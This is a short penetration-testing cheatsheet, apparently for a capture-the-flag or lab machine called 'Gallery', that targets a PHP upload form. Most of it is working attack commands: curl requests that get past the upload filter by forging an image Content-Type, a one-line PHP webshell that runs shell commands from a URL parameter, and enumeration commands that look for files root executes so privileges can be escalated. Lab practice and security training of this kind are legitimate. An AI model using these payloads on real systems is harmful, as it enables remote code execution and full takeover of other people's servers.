# Cheatsheet — Gallery

## Targets

- **web02** — apache + php; upload form, autoindexed /uploads/

## Useful commands

```bash
# upload bypass attempts
curl -F 'photo=@shell.phtml;type=image/png' http://<ip>/upload.php
curl 'http://<ip>/uploads/shell.phtml?c=id'

# tiny webshell payload
echo '<?php system($_GET["c"]); ?>' > shell.phtml

# once you have a shell as www-data
find / -group www-data -writable 2>/dev/null
systemctl list-timers --all
ls -l /opt/webapp/
cat /etc/systemd/system/webapp-health.*
```

## Concepts

- Blacklists enumerate what can't hurt; whitelists enumerate what's safe —
  attackers love the first kind
- `Content-Type` in multipart bodies is *client-supplied* — forge it
- A group- or world-writable file that root executes = scheduled privesc
